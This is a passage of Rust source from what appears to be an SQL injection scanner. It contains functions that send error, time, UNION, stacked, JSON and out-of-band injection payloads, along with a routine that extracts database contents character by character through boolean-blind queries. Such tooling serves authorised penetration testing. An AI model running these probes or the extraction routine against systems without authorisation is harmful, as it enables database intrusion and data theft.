            }
            let r = detector.evaluate(&body);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans
                        .iter()
                        .map(super::super::techniques::tamper::Tamper::name)
                        .collect::<Vec<_>>()
                        .join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    r.confidence,
                    format!(
                        "error pattern {:?} tamper={}{}{}{}",
                        r.matched_pattern,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_time_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    // Single-payload technique: `--level` carries no extra budget here.
    let _ = level;
    let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
    let base = time_payload_for(None, 3);
    let sets = tamper_transformation_sets(tampers);
    for trans in &sets {
        if cancel.is_cancelled() {
            break;
        }
        let payload_str = build_final_payload(&base.payload, trans, popts);
        let (raw_body, ms, status) = fetch_for_payload(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &payload_str,
            marker_set,
            raw,
            opts,
            popts,
        )
        .await;
        // `--ignore-code`: an ignored status is skipped, never a finding.
        if is_ignored(status, ignore_codes) {
            continue;
        }
        let body = matcher.pre_process(&raw_body);
        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
        #[allow(clippy::cast_precision_loss)]
        let r = detector.evaluate(ms, base.sleep_secs as f64);
        if r.is_vulnerable {
            // Matcher veto gate: `Some(false)` rejects the candidate.
            if matcher.matches(&body, status) == Some(false) {
                continue;
            }
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            let finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Time,
                r.confidence,
                format!(
                    "time delay {:.0}ms > threshold {:.0}ms tamper={}{}{}{}",
                    r.measured_ms,
                    detector.threshold(),
                    tamper_label,
                    opts.evidence_suffix(),
                    popts.evidence_suffix(),
                    matcher.evidence_suffix()
                ),
            );
            state.write().await.push_finding(finding);
            break;
        }
    }
}

/// Enumerate column count via ORDER BY probing before UNION.
/// Sequential probing `ORDER BY 1 .. MAX`, stops at first error detected by
/// `UnionDetector::evaluate_order_by`. Returns `Some(n)` where `n = failed_index - 1`.
/// Rate limiting and jitter are preserved via `fetch_for_payload`; cancellation is honoured.
#[allow(clippy::too_many_arguments)]
async fn enumerate_columns_via_order_by(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    detector: &UnionDetector,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) -> Option<usize> {
    // `--level` widens ORDER BY enumeration: L1=10 (historical), L2=15, L3+=20.
    let max_order_by_cols: usize = match level {
        1 => 10,
        2 => 15,
        _ => 20,
    };
    let sets = tamper_transformation_sets(tampers);
    for i in 1..=max_order_by_cols {
        if cancel.is_cancelled() {
            return None;
        }
        let base = format!("' ORDER BY {i} -- -");
        let mut triggered = false;
        for trans in &sets {
            if cancel.is_cancelled() {
                return None;
            }
            let payload = build_final_payload(&base, trans, popts);
            let (raw_body, _ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &payload, marker_set, raw, opts,
                popts,
            )
            .await;
            // `--ignore-code`: an ignored response never triggers an ORDER BY error.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let body = matcher.pre_process(&raw_body);
            if detector.evaluate_order_by(&body) {
                triggered = true;
                break;
            }
        }
        if triggered {
            if i == 1 {
                warn!("ORDER BY 1 already errored — ORDER BY enumeration inconclusive");
                return None;
            }
            let inferred = i - 1;
            info!(inferred, "ORDER BY enumeration inferred column count");
            return Some(inferred);
        }
    }
    info!("ORDER BY enumeration found no error up to {max_order_by_cols} — undetermined");
    None
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn test_union_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    let detector = UnionDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let tamper_sets = tamper_transformation_sets(tampers);

    // Phase 0 — ORDER BY enumeration to reduce false positives.
    // If we successfully infer `n`, we test only `n` first. If that fails, we
    // still fall back to the heuristic list (excluding the already-tried `n`) to
    // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
    let inferred = enumerate_columns_via_order_by(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        marker_set,
        &detector,
        raw,
        tampers,
        opts,
        popts,
        matcher,
        level,
        ignore_codes,
    )
    .await;

    let mut cols_to_try: Vec<usize> = Vec::new();
    let mut fallback = vec![3usize, 2, 4, 5];
    if let Some(n) = inferred {
        cols_to_try.push(n);
        // Keep fallback for resilience but avoid duplicate probe
        fallback.retain(|c| *c != n);
    } else {
        cols_to_try = fallback.clone();
        fallback.clear();
    }

    // Primary pass: inferred or heuristic
    for cols in &cols_to_try {
        if cancel.is_cancelled() {
            return;
        }
        let cols = *cols;
        let payloads = union_payloads_for(None, cols);
        for p in payloads
            .iter()
            .take(payload_budget(level, 1, payloads.len()))
        {
            if cancel.is_cancelled() {
                return;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    return;
                }
                let tampered = build_final_payload(&p.payload, trans, popts);
                let (raw_body, ms, status) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts, popts,
                )
                .await;
                // `--ignore-code`: an ignored status is skipped, never a finding.
                if is_ignored(status, ignore_codes) {
                    continue;
                }
                let body = matcher.pre_process(&raw_body);
                let r =
                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                if r.is_vulnerable {
                    // Matcher veto gate: `Some(false)` rejects the candidate.
                    if matcher.matches(&body, status) == Some(false) {
                        continue;
                    }
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans
                            .iter()
                            .map(super::super::techniques::tamper::Tamper::name)
                            .collect::<Vec<_>>()
                            .join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} tamper={}{}{}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix(),
                            popts.evidence_suffix(),
                            matcher.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }

    // Secondary pass: fallback heuristic if primary (inferred) yielded nothing
    for cols in fallback {
        if cancel.is_cancelled() {
            break;
        }
        let payloads = union_payloads_for(None, cols);
        for p in payloads
            .iter()
            .take(payload_budget(level, 1, payloads.len()))
        {
            if cancel.is_cancelled() {
                break;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    break;
                }
                let tampered = build_final_payload(&p.payload, trans, popts);
                let (raw_body, ms, status) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts, popts,
                )
                .await;
                // `--ignore-code`: an ignored status is skipped, never a finding.
                if is_ignored(status, ignore_codes) {
                    continue;
                }
                let body = matcher.pre_process(&raw_body);
                let r =
                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                if r.is_vulnerable {
                    // Matcher veto gate: `Some(false)` rejects the candidate.
                    if matcher.matches(&body, status) == Some(false) {
                        continue;
                    }
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans
                            .iter()
                            .map(super::super::techniques::tamper::Tamper::name)
                            .collect::<Vec<_>>()
                            .join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} (fallback) tamper={}{}{}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix(),
                            popts.evidence_suffix(),
                            matcher.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_stacked_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    let detector = StackedDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let payloads = stacked_payloads_for(None);
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = build_final_payload(&p.payload, trans, popts);
            let (raw_body, ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
                popts,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans
                        .iter()
                        .map(super::super::techniques::tamper::Tamper::name)
                        .collect::<Vec<_>>()
                        .join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Stacked,
                    r.confidence,
                    format!(
                        "stacked dbms={} marker={} tamper={}{}{}{}",
                        r.dbms.as_deref().unwrap_or("?"),
                        p.marker,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = r.dbms.clone();
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// JSON-function injection: boolean differential over `JSON_EXTRACT` / `->>` /
/// `JSON_VALUE` pairs (3-trial confirmation) plus a single-shot error probe
/// (`__bad__` sentinel document → per-DBMS JSON error text).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::similar_names)]
#[allow(clippy::too_many_lines)]
async fn test_json_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    let detector = JsonDetector::new();
    let payloads = json_payloads_for(None);
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let true_payload = build_final_payload(&p.true_payload, trans, popts);
            let false_payload = build_final_payload(&p.false_payload, trans, popts);
            let error_probe = build_final_payload(&p.error_payload, trans, popts);
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            // Channel 1 — boolean differential with confirmation (3 trials)
            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            let mut last_true = String::new();
            let mut last_false = String::new();
            let mut last_t_status: u16 = 0;
            #[allow(clippy::similar_names)]
            let mut last_f_status: u16 = 0;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_raw, true_ms, true_status) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &true_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                )
                .await;
                let true_body = matcher.pre_process(&true_raw);
                let (false_raw, false_ms, false_status) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &false_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                )
                .await;
                let false_body = matcher.pre_process(&false_raw);
                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.0,
                        false_conf: 1.0,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                let res = detector.evaluate_boolean(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push(crate::detection::confirmation::Trial {
                    true_conf: res.true_similarity,
                    false_conf: res.false_similarity,
                });
                last_res = Some(res);
                last_true = true_body;
                last_false = false_body;
                last_t_status = true_status;
                last_f_status = false_status;
            }
            let conf = crate::detection::confirmation::confirm(&trials);
            if conf.confirmed {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
                    == Some(false)
                {
                    continue;
                }
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate_boolean(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Json,
                    conf.score,
                    format!(
                        "json channel=boolean dbms={} true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}",
                        p.dbms,
                        res.true_similarity,
                        res.false_similarity,
                        conf.trials,
                        conf.false_positive_prob,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
            // Channel 2 — single-shot JSON error probe
            let (raw_body, _ms, status) = fetch_for_payload(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &error_probe,
                marker_set,
                raw,
                opts,
                popts,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let r = detector.evaluate_error(&body);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Json,
                    r.confidence,
                    format!(
                        "json channel=error pattern={:?} tamper={}{}{}{}",
                        r.matched_pattern,
                        tamper_label,
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                );
                finding.dbms = r.dbms.clone().or_else(|| Some(p.dbms.clone()));
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// OOB detection: send DNS/HTTP probes embedding a unique token, then poll the
/// collaborator for the callback.
///
/// OPT-IN: skipped silently when `oob_domain` is `None` (no infra). Invalid
/// domains are rejected with a warning. Without `oob_poll_url` probes are
/// still sent but never auto-confirmed — the operator checks the collaborator
/// UI manually for `<token>.<domain>` (no finding is emitted without
/// evidence, to avoid false positives).
///
/// Flow per parameter: one fresh token, up to 3 DBMS-generic probes (each
/// with tamper variants), cancellable wait for the async DB-side query,
/// then poll (`HttpPollVerifier` or `NoopVerifier`). A finding
/// (`TechniqueKind::Oob`, confidence 0.95) is pushed only on callback.
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn test_oob_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    oob_domain: Option<String>,
    oob_poll_url: Option<String>,
    oob_wait_secs: u64,
) {
    use crate::techniques::oob::verifier::OobVerifier as _;
    let Some(domain) = oob_domain else {
        return;
    };
    if !is_valid_oob_domain(&domain) {
        warn!(domain=%domain, "invalid --oob-domain, skipping OOB probes");
        return;
    }
    let token = new_token();
    let detector = OobDetector::new(domain.clone());
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let payloads = oob_payloads_for(None, &domain, &token);
    let tamper_sets = tamper_transformation_sets(tampers);
    let has_poll_url = oob_poll_url
        .as_deref()
        .is_some_and(|u| !u.trim().is_empty());

    // Phase 1 — send probes (one token shared so a single poll correlates any
    // DBMS vector). Cap at 3 payloads x tamper variants to bound requests.
    // Keep the last response for evidence; OOB is async so the body is
    // expected to match baseline.
    let mut last_body = baseline_body.clone();
    let mut last_ms = baseline.mean_ms;
    let mut last_status: u16 = 0;
    let mut last_payload_idx = 0usize;
    let mut probes_sent = 0usize;
    for (pi, p) in payloads
        .iter()
        .take(payload_budget(level, 3, payloads.len()))
        .enumerate()
    {
        if cancel.is_cancelled() {
            return;
        }
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                return;
            }
            let tampered = build_final_payload(&p.payload, trans, popts);
            let (raw_body, ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
                popts,
            )
            .await;
            probes_sent += 1;
            // `--ignore-code`: an ignored probe response is discarded
            // (kept baseline-neutral); the final gate below vetoes when the
            // last probe was ignored — never a finding.
            if is_ignored(status, ignore_codes) {
                last_status = status;
                if !has_poll_url {
                    // Without confirmation infra one variant per payload is enough;
                    // the operator checks the collaborator UI manually.
                    break;
                }
                continue;
            }
            last_body = matcher.pre_process(&raw_body);
            last_ms = ms;
            last_status = status;
            last_payload_idx = pi;
            if !has_poll_url {
                // Without confirmation infra one variant per payload is enough;
                // the operator checks the collaborator UI manually.
                break;
            }
        }
    }
    if probes_sent == 0 {
        return;
    }

    if !has_poll_url {
        let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
        let r = detector.evaluate_without_callback(
            &baseline_body,
            &last_body,
            baseline.mean_ms,
            last_ms,
            p,
        );
        if r.confidence >= 0.35 {
            info!(
                token=%p.token,
                fqdn=%p.fqdn,
                channel=%p.channel.to_string(),
                "oob probe sent (no --oob-poll-url) — check collaborator for callback, no auto-finding"
            );
        }
        return;
    }

    // Phase 2 — single wait + poll for the shared token (async DB execution
    // + collaborator propagation lag). Bounded: 1 wait + up to 3 polls.
    let wait = core::time::Duration::from_secs(oob_wait_secs.clamp(0, 30));
    if !wait.is_zero() {
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(wait) => {},
        }
    }
    let poll_verifier = crate::techniques::oob::verifier::HttpPollVerifier::new(
        oob_poll_url.clone().unwrap_or_default(),
        8,
    );
    let mut callback_seen = false;
    for _ in 0..3 {
        if cancel.is_cancelled() {
            return;
        }
        if poll_verifier.verify(&token).await {
            callback_seen = true;
            break;
        }
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(core::time::Duration::from_secs(2)) => {},
        }
    }
    let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
    // `--ignore-code`: never confirm on an ignored final response.
    if is_ignored(last_status, ignore_codes) {
        return;
    }
    let r = detector.evaluate_with_callback(
        &baseline_body,
        &last_body,
        baseline.mean_ms,
        last_ms,
        p,
        callback_seen,
    );
    if r.is_vulnerable {
        // Matcher veto gate: `Some(false)` rejects the candidate.
        if matcher.matches(&last_body, last_status) == Some(false) {
            return;
        }
        let mut finding = crate::session::state::Finding::new(
            target.as_str(),
            param.key(),
            crate::session::state::TechniqueKind::Oob,
            r.confidence,
            format!(
                "oob channel={} dbms={} token={} fqdn={} probes={}{}{}{}",
                r.channel,
                r.dbms.as_deref().unwrap_or("?"),
                r.token,
                p.fqdn,
                probes_sent,
                opts.evidence_suffix(),
                popts.evidence_suffix(),
                matcher.evidence_suffix(),
            ),
        );
        finding.dbms = r.dbms.clone();
        state.write().await.push_finding(finding);
    }
}

/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
/// Uses binary search on ASCII values with the provided query.
/// Dialect-aware: length/char comparison built from `DbmsKind`
/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn extract_enum_field(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    baseline_body: &str,
    baseline_mean: f64,
    query: String,
    label: String,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    dbms_kind: &crate::dbms::DbmsKind,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    _ignore_codes: &[u16],
) -> Result<Option<String>, crate::error::InjektError> {
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );

    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
    // baseline and fetched bodies before `diff_against_baseline` so the
    // comparison stays consistent. No veto by `--code`/`--string` here:
    // enumeration is detection-only (a veto would only hide data).
    let baseline_proc = matcher.pre_process(baseline_body);

    // First infer length (max 500 chars for enum results)
    let mut inferred_len = 0;
    for len_guess in 1..=500 {
        if cancel.is_cancelled() {
            break;
        }
        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
        let payload = build_final_payload(&base, tampers, popts);
        let spec = build_injection_spec_with_raw(
            target, target_str, param, &payload, marker_set, raw, opts, popts,
        );
        let start = std::time::Instant::now();
        let resp = client.send_with_retry(spec, cancel).await;
        let ms = start.elapsed().as_secs_f64() * 1000.0;
        state.write().await.increment_requests();
        let raw_body = match resp {
            Ok(r) => r.text().await.unwrap_or_default(),
            Err(_) => String::new(),
        };
        let body = matcher.pre_process(&raw_body);
        let diff = crate::detection::response_diff::diff_against_baseline(
            &baseline_proc,
            &body,
            baseline_mean,
            ms,
            100.0,
        );
        if diff.confidence < 0.4 {
            inferred_len = len_guess;
        } else {
            break;
        }
    }
    if inferred_len == 0 {
        warn!(label=%label, "enumeration length inference failed");
        return Ok(None);
    }

    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_clone = target.clone();
    let target_str_clone = target_str.to_owned();
    let param_clone = param.clone();
    let marker_set_clone = marker_set.clone();
    let baseline_body_clone = baseline_proc.clone();
    let baseline_mean_clone = baseline_mean;
    let query_for_oracle = query.clone();
    let raw_for_oracle = raw.cloned();
    let tampers_for_oracle = tampers.to_vec();
    let dbms_for_oracle = *dbms_kind;
    let popts_for_oracle = (*popts).clone();
    let matcher_for_oracle = matcher.clone();

    let oracle = move |pos: usize, mid: u8| {
        let client = client_clone.clone();
        let state = state_clone.clone();
        let cancel = cancel_clone.clone();
        let target = target_clone.clone();
        let target_str = target_str_clone.clone();
        let param = param_clone.clone();
        let marker_set = marker_set_clone.clone();
        let baseline_body = baseline_body_clone.clone();
        let query = query_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        let dbms_kind = dbms_for_oracle;
        let popts = popts_for_oracle.clone();
        let matcher = matcher_for_oracle.clone();
        async move {
            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
            let base = format!("' AND {cmp} -- -");
            let payload = build_final_payload(&base, &tampers, &popts);
            let spec = build_injection_spec_with_raw(
                &target,
                &target_str,
                &param,
                &payload,
                &marker_set,
                raw.as_ref(),
                opts,
                &popts,
            );
            let start = std::time::Instant::now();
            let resp = client.send_with_retry(spec, &cancel).await;
            let ms = start.elapsed().as_secs_f64() * 1000.0;
            state.write().await.increment_requests();
            let raw_body = match resp {
                Ok(r) => r.text().await.unwrap_or_default(),
                Err(_) => String::new(),
            };
            let body = matcher.pre_process(&raw_body);
            let diff = crate::detection::response_diff::diff_against_baseline(
                &baseline_body,
                &body,
                baseline_mean_clone,
                ms,
                100.0,
            );
            Ok::<bool, InjektError>(diff.confidence < 0.4)
        }
    };

    let extracted = engine.extract(inferred_len, oracle).await?;
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
    Ok(Some(exposed))
}
